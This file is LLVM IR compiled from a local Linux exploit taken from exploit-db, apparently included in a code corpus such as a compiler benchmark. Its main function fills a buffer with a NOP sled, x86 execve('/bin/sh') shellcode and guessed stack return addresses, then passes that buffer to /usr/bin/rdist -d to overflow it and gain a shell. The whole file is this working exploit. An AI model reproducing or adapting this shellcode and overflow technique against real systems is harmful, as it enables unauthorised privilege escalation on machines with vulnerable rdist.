; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19106.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19106.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.execshell = private unnamed_addr constant [69 x i8] c"\EB#^\8D\1E\89^\0B1\D2\89V\07\89V\0F\89V\14\88V\191\C0\B0;\8DN\0B\89\CARQSP\EB\18\E8\D8\FF\FF\FF/bin/sh\01\01\01\01\02\02\02\02\03\03\03\03\9A\04\04\04\04\07\04\00", align 16
@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [31 x i8] c"Using offset of esp + %d (%x)\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"can't allocate memory\0A\00", align 1
@BUFFER_SIZE = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [15 x i8] c"/usr/bin/rdist\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"rdist\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"-d\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [69 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %6, align 8
  store i64* null, i64** %7, align 8
  store i8* null, i8** %8, align 8
  %12 = bitcast [69 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([69 x i8], [69 x i8]* @__const.main.execshell, i32 0, i32 0), i64 69, i1 false)
  %13 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %13, i32* %11, align 4
  %14 = load i32, i32* %4, align 4
  %15 = icmp eq i32 %14, 2
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 1
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @atoi(i8* %19)
  store i32 %20, i32* %11, align 4
  br label %21

21:                                               ; preds = %16, %2
  %22 = load i32, i32* %11, align 4
  %23 = call i32 (...) @get_esp()
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %23, %24
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0), i32 %22, i32 %25)
  %27 = call i8* @malloc(i32 4096)
  store i8* %27, i8** %6, align 8
  %28 = load i8*, i8** %6, align 8
  %29 = icmp ne i8* %28, null
  br i1 %29, label %33, label %30

30:                                               ; preds = %21
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0))
  %32 = call i32 @exit(i32 0) #4
  unreachable

33:                                               ; preds = %21
  %34 = load i8*, i8** %6, align 8
  store i8* %34, i8** %8, align 8
  %35 = load i8*, i8** %8, align 8
  %36 = load i64, i64* @BUFFER_SIZE, align 8
  %37 = getelementptr inbounds [69 x i8], [69 x i8]* %9, i64 0, i64 0
  %38 = call i32 @strlen(i8* %37)
  %39 = sext i32 %38 to i64
  %40 = sub nsw i64 %36, %39
  %41 = call i32 @memset(i8* %35, i32 144, i64 %40)
  %42 = load i64, i64* @BUFFER_SIZE, align 8
  %43 = getelementptr inbounds [69 x i8], [69 x i8]* %9, i64 0, i64 0
  %44 = call i32 @strlen(i8* %43)
  %45 = sext i32 %44 to i64
  %46 = sub nsw i64 %42, %45
  %47 = load i8*, i8** %8, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 %46
  store i8* %48, i8** %8, align 8
  store i32 0, i32* %10, align 4
  br label %49

49:                                               ; preds = %61, %33
  %50 = load i32, i32* %10, align 4
  %51 = getelementptr inbounds [69 x i8], [69 x i8]* %9, i64 0, i64 0
  %52 = call i32 @strlen(i8* %51)
  %53 = icmp slt i32 %50, %52
  br i1 %53, label %54, label %64

54:                                               ; preds = %49
  %55 = load i32, i32* %10, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [69 x i8], [69 x i8]* %9, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = load i8*, i8** %8, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %8, align 8
  store i8 %58, i8* %59, align 1
  br label %61

61:                                               ; preds = %54
  %62 = load i32, i32* %10, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %10, align 4
  br label %49

64:                                               ; preds = %49
  %65 = load i8*, i8** %8, align 8
  %66 = bitcast i8* %65 to i64*
  store i64* %66, i64** %7, align 8
  store i32 0, i32* %10, align 4
  br label %67

67:                                               ; preds = %77, %64
  %68 = load i32, i32* %10, align 4
  %69 = icmp slt i32 %68, 2
  br i1 %69, label %70, label %80

70:                                               ; preds = %67
  %71 = call i32 (...) @get_esp()
  %72 = load i32, i32* %11, align 4
  %73 = add nsw i32 %71, %72
  %74 = sext i32 %73 to i64
  %75 = load i64*, i64** %7, align 8
  %76 = getelementptr inbounds i64, i64* %75, i32 1
  store i64* %76, i64** %7, align 8
  store i64 %74, i64* %75, align 8
  br label %77

77:                                               ; preds = %70
  %78 = load i32, i32* %10, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %10, align 4
  br label %67

80:                                               ; preds = %67
  %81 = load i64*, i64** %7, align 8
  %82 = bitcast i64* %81 to i8*
  store i8* %82, i8** %8, align 8
  %83 = load i8*, i8** %8, align 8
  store i8 0, i8* %83, align 1
  %84 = load i8*, i8** %6, align 8
  %85 = load i8*, i8** %6, align 8
  %86 = call i32 @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %84, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %85, i32* null)
  %87 = load i32, i32* %3, align 4
  ret i32 %87
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @get_esp(...) #2

declare dso_local i8* @malloc(i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @memset(i8*, i32, i64) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i8*, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
